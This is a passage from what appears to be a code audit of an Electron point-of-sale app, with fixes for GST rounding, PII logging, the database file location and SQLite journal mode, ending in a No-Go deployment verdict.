+    6     const divisor = 1 + gstRate / 100;
+    7
+    8     const taxableValueInPaise = Math.round(totalMRPInPaise / divisor);
+    9     const gstAmountInPaise = totalMRPInPaise - taxableValueInPaise;
+   10
+   11     // Use Math.floor and Math.ceil to avoid losing a paisa on odd splits
+   12     const cgstInPaise = Math.floor(gstAmountInPaise / 2);
+   13     const sgstInPaise = Math.ceil(gstAmountInPaise / 2);
+   14
+   15     // ... store these integer values in the DB (requires schema change)
+   16     // or divide by 100 right before insertion.
+   17     enrichedItems.push({
+   18         ...i,
+   19         taxable_value: taxableValueInPaise / 100,
+   20         gst_amount: gstAmountInPaise / 100,
+   21         cgst: cgstInPaise / 100,
+   22         sgst: sgstInPaise / 100,
+   23     });
+   * Test: Process a transaction with an odd-numbered price and GST amount that would typically cause rounding issues.
+     Verify that CGST + SGST exactly equals GST Amount and that the total calculation is correct to the cent.
+
+  ---
+
+  C. Privacy & Compliance
+
+  ---
+
+  [HIGH] PII Leaked in Production Logs
+
+   * Evidence: (main.js, save-sale handler)
+
+   1     console.log("🧾 Processing Sale...");
+   2     console.log("Invoice No:", invoice_no);
+   3     console.log("Date:", timestamp);
+   4     console.log("Payment Method:", payment_method);
+   5     console.log("Customer:", customer_name, customer_phone, customer_gstin); // PII
+   6     console.log("Items:", items);
+   * Impact: Sensitive Personally Identifiable Information (PII) like customer names and phone numbers are logged to the
+     console. In a production environment, these logs could be collected or become accessible, violating user privacy and
+     regulations like the DPDP Act.
+   * Fix: Guard all logs containing PII to ensure they only run during development.
+
+   1     // In main.js, inside the 'save-sale' handler
+   2     if (process.env.NODE_ENV !== 'production') {
+   3         console.log("🧾 Processing Sale...");
+   4         console.log("Invoice No:", invoice_no);
+   5         console.log("Date:", timestamp);
+   6         console.log("Payment Method:", payment_method);
+   7         console.log("Customer:", customer_name, customer_phone, customer_gstin);
+   8         console.log("Items:", items);
+   9     }
+   * Test: Run the packaged application in production mode. Perform a sale and verify that no customer information appears
+     in the console logs.
+
+  ---
+
+  D. Operations
+
+  ---
+
+  [CRITICAL] Database Stored in Application Directory
+
+   * Evidence: (db.js)
+   1     const dbPath = path.join(__dirname, 'pos.db');
+   * Impact: The database is located using __dirname, which points to the application's installation folder. This folder is
+      often read-only, will be overwritten on application updates (deleting all user data), and may not have the correct
+     permissions. This is a critical architectural flaw that will cause data loss.
+   * Fix: Use app.getPath('userData') to store the database in the user's local application data directory. This requires
+     passing the path from main.js to db.js.
+
+    1     // In main.js
+    2     const dbPath = path.join(app.getPath('userData'), 'pos.db');
+    3     const dbAPI = require('./db')(dbPath); // Pass path to db module
+    4
+    5     // In db.js, modify the module to accept the path
+    6     const path = require('path');
+    7     let db;
+    8
+    9     module.exports = function(dbPath) {
+   10         try {
+   11             const Database = require('better-sqlite3');
+   12             console.log("📁 [DEBUG] DB path received:", dbPath);
+   13             db = new Database(dbPath);
+   14             // ... rest of db.js initialization
+   15         } catch (err) {
+   16             // ...
+   17         }
+   18
+   19         // ... all db functions
+   20
+   21         return { /* exports */ };
+   22     }
+   * Test: Package the application. Install and run it. Add some data. Close the application. Uninstall and reinstall it.
+     The data should persist because it's stored outside the installation directory.
+
+  ---
+
+  [MEDIUM] Journal Mode Not Specified
+
+   * Evidence: (db.js) The database initialization does not set a journal_mode.
+   * Impact: The default journal mode (DELETE) is less resilient to crashes than WAL (Write-Ahead Logging). A crash during
+     a transaction could lead to a corrupt database file. WAL mode provides significantly better concurrency and
+     durability.
+   * Fix: Set WAL mode immediately after opening the database connection.
+
+    1     --- a/db.js
+    2     +++ b/db.js
+    3     @@ -6,6 +6,7 @@
+    4    db = new Database(dbPath);
+    5
+    6    db.pragma('foreign_keys = ON');
+    7 +  db.pragma('journal_mode = WAL');
+    8
+    9    // ✅ Create initial products table (for first install only)
+   10    db.prepare(`
+   * Test: Verify the application works as expected. The benefits of WAL mode are primarily in crash safety and
+     performance under load, which can be difficult to unit test but is a standard best practice for better-sqlite3.
+
+  ---
+
+  Go / No-Go Verdict
+
+  No-Go for production deployment.
+
+  The application has critical vulnerabilities that will lead to user data loss, data integrity failures, and
+  significant security risks.
+
+  Top 5 Blockers for Production
+
+   1. [CRITICAL] Incorrect Database Path: Storing the database with __dirname (D.1) will cause guaranteed data loss for
+      users upon application updates. This must be fixed before any deployment.
+   2. [CRITICAL] Non-Atomic Sale Transactions: The saveSale function (B.1) is not atomic, which will inevitably lead to
+      corrupted financial data (orphaned sales, incorrect totals). This undermines the core purpose of a POS system.
+   3. [CRITICAL] Missing IPC Payload Validation: Lack of validation (A.2) makes the main process vulnerable to crashes and
+      data corruption from the renderer process.
+   4. [CRITICAL] Missing Content-Security-Policy: The absence of a CSP (A.1) creates a significant XSS risk.
+   5. [HIGH] PII Logging in Production: Logging customer data (C.1) is a major privacy violation and must be removed before
+      deployment.
